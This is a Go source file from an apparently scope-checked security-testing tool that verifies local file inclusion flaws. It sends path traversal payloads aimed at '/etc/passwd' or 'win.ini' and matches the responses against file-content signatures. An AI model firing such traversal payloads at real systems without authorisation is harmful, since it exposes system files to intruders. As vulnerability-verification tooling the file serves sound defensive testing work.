package verify

import (
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/srank-org/ensphere/internal/evidence"
)

// LFIConfig holds configuration for LFI verification.
type LFIConfig struct {
	URL    string
	Param  string
	OS     string // linux | windows
	Method string
	ProbeConfig
}

var lfiPayloads = map[string]string{
	"linux":   "../../../../etc/passwd",
	"windows": `..\..\..\..\windows\win.ini`,
}

var lfiSignatures = map[string][]string{
	"linux":   {"root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh"},
	"windows": {"[extensions]", "[fonts]", "for 16-bit app support"},
}

// VerifyLFI runs the local file inclusion verification probe.
func VerifyLFI(cfg LFIConfig) (*ProbeResult, error) {
	if err := CheckScope(cfg.URL, cfg.InScope); err != nil {
		return nil, err
	}

	if err := CheckMaxRisk(3, cfg.MaxRisk); err != nil {
		return nil, err
	}

	payload, ok := lfiPayloads[cfg.OS]
	if !ok {
		return nil, &ScopeError{Msg: fmt.Sprintf("unsupported OS %q — use: linux, windows", cfg.OS)}
	}
	sigs := lfiSignatures[cfg.OS]

	timer := NewTimer()
	throttle := NewThrottle(cfg.ThrottleMs)

	var ew *evidence.Writer
	if cfg.Evidence != "" {
		var err error
		ew, err = evidence.NewWriter(cfg.Evidence)
		if err != nil {
			fmt.Fprintf(os.Stderr, "Warning: could not open evidence file: %v\n", err)
		} else {
			defer ew.Close()
		}
	}

	probeCount := 0

	// Baseline
	throttle.Wait()
	probeCount++
	baselineResp := lfiProbeWithParam(cfg, "test")
	if baselineResp.Error != nil {
		return nil, fmt.Errorf("baseline probe: %w", baselineResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[BASELINE] status=%d hash=%s\n", baselineResp.StatusCode, baselineResp.BodyHash[:16])
	writeEvidence(ew, "lfi", "path_traversal", cfg.URL, cfg.Param, baselineResp.StatusCode,
		fmt.Sprintf("%dms", baselineResp.ElapsedMs), "baseline", "")

	// Payload probe
	throttle.Wait()
	probeCount++
	probeResp := lfiProbeWithParam(cfg, payload)
	if probeResp.Error != nil {
		return nil, fmt.Errorf("lfi probe: %w", probeResp.Error)
	}
	fmt.Fprintf(os.Stderr, "[PROBE] status=%d hash=%s\n", probeResp.StatusCode, probeResp.BodyHash[:16])
	writeEvidence(ew, "lfi", "path_traversal", cfg.URL, cfg.Param, probeResp.StatusCode,
		fmt.Sprintf("%dms", probeResp.ElapsedMs), "probe", fmt.Sprintf("payload=%s", payload))

	var matchedSignatures []string
	for _, sig := range sigs {
		if strings.Contains(probeResp.Body, sig) {
			matchedSignatures = append(matchedSignatures, sig)
		}
	}

	snippet := probeResp.Body
	if len(snippet) > 500 {
		snippet = snippet[:500]
	}

	baseline := RoundResult{
		StatusCode: baselineResp.StatusCode,
		ElapsedMs:  baselineResp.ElapsedMs,
		BodyHash:   baselineResp.BodyHash,
		BodyLength: len(baselineResp.Body),
	}
	probe := RoundResult{
		StatusCode: probeResp.StatusCode,
		ElapsedMs:  probeResp.ElapsedMs,
		BodyHash:   probeResp.BodyHash,
		BodyLength: len(probeResp.Body),
	}

	return &ProbeResult{
		VulnType:   "lfi",
		Technique:  "path_traversal",
		StartedAt:  timer.StartedAt(),
		ProbeCount: probeCount,
		Duration:   timer.Elapsed(),
		Measurements: LFIMeasurements{
			Baseline:          baseline,
			Probe:             probe,
			HashesMatch:       baselineResp.BodyHash == probeResp.BodyHash,
			MatchedSignatures: matchedSignatures,
			PayloadUsed:       payload,
			ResponseSnippet:   snippet,
		},
	}, nil
}

func lfiProbeWithParam(cfg LFIConfig, value string) ProbeResponse {
	if strings.ToUpper(cfg.Method) == "POST" {
		body := url.Values{cfg.Param: {value}}.Encode()
		headers := make(map[string]string)
		for k, v := range cfg.Headers {
			headers[k] = v
		}
		headers["Content-Type"] = "application/x-www-form-urlencoded"
		return HTTPProbe("POST", cfg.URL, body, headers, cfg.TimeoutSec, cfg.InScope)
	}
	parsed, err := url.Parse(cfg.URL)
	if err != nil {
		return ProbeResponse{Error: fmt.Errorf("parse URL: %w", err)}
	}
	params := parsed.Query()
	params.Set(cfg.Param, value)
	parsed.RawQuery = params.Encode()
	return HTTPProbe(cfg.Method, parsed.String(), "", cfg.Headers, cfg.TimeoutSec, cfg.InScope)
}
